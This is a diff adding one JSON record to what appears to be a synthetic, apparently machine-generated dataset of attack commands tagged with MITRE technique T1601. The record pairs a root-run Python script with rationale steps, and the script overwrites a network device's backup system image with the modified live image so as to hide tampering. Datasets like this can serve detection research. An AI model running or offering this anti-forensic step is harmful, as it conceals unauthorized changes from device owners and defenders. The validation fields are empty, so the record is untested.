@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Python",
+  "command": "python3 - <<'PY'\nimport os, sys, shutil, filecmp\nif os.geteuid() != 0:\n    sys.exit(\"root required\")\n\ncurrent = \"/boot/flash/system.img\"\nbackup = \"/boot/backup/system.img.bak\"\n\nos.makedirs(os.path.dirname(backup), exist_ok=True)\nif not os.path.exists(backup) or not filecmp.cmp(current, backup, shallow=False):\n    shutil.copy2(current, backup)\n    assert filecmp.cmp(current, backup, shallow=False)\n    print(\"Synchronized backup to match current system image\")\nelse:\n    print(\"Backup already matches current image\")\nPY",
+  "explanation": "Ensures the backup image mirrors the currently modified system image, masking unauthorized changes by updating the backup copy.",
+  "rationale_steps": [
+    "Require root to read/write boot and backup locations.",
+    "Compare the active image with the backup using filecmp.",
+    "If different, overwrite the backup and verify equality to conceal the tampering."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1601-0c03443f-2dfd4a7b",
+  "source_prompt_hash": "0c03443f",
+  "timestamp_utc": "2025-09-30T04:56:19.919567Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
